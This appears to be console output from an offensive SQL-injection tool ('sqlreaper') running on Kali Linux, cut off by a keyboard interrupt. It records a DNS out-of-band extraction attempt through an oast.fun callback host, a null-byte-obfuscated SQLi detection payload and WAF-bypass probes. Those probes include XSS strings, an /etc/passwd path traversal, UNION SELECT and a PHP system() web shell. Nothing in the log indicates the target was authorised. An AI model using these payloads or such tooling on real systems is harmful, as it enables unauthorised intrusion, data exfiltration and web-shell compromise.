+[+] [SideChannel] DNS OOB extraction  qcjsisjnbssjqeggffbbfa7nxf0l3bri3.oast.fun
+[SideChannel] Probing WHERE-ERROR (1 strategies)...
+[SideChannel]  No WHERE-ERROR strategy viable
+[SideChannel] Probing HEADER FINGERPRINT oracle...
+[+] [SideChannel] No side channels  trying DIRECT extraction before MSE
+[+] [Direct] Detection payload (raw/wire):  A%00ND typeof(1)='integer'-- -
+[+] [Direct] Detection payload (decoded): A ND typeof(1)='integer'-- -
+[+] [Direct] No sleep or heavy-query pattern — skipping direct timing extraction
+[+] [Direct] Falling back to MSE timing
+[+] [Novel]  Starting 7 novel WAF bypass extraction techniques 
+[+] [Novel] Technique 1: WAF Weaponization (using WAF as boolean oracle)
+[+] [Novel-1] Testing WAF trigger 1/7: <script>alert(1)</script>...
+[+] [Novel-1] Testing WAF trigger 2/7: ../../../../../../etc/passwd...
+[+] [Novel-1] Testing WAF trigger 3/7: <img src=x onerror=alert(1)>...
+[+] [Novel-1] Testing WAF trigger 4/7: javascript:alert(1)...
+[+] [Novel-1] Testing WAF trigger 5/7: UNION SELECT FROM...
+[+] [Novel-1] Testing WAF trigger 6/7: <?php system($_GET['c']); ?>...
+[+] [Novel-1] Testing WAF trigger 7/7: ${7*7}...
+[+] [Novel]  No WAF trigger produced different response
+[+] [Novel] Technique 2: Micro-timing (statistical sub-threshold delays)
+[+] [Novel-2] Micro-timing sample 1/10...
+[+] [Novel-2] Micro-timing sample 6/10...
+^CTraceback (most recent call last):
+  File "/home/kali/Desktop/sqlreaper_v214.py", line 182497, in <module>
+    _main_thread.join()
+    ~~~~~~~~~~~~~~~~~^^
+  File "/usr/lib/python3.13/threading.py", line 1094, in join
+    self._handle.join(timeout)
+    ~~~~~~~~~~~~~~~~~^^^^^^^^^
+KeyboardInterrupt
+^CTraceback (most recent call last):
+  File "/usr/lib/python3.13/threading.py", line 1542, in _shutdown
+    _thread_shutdown()
+KeyboardInterrupt: 
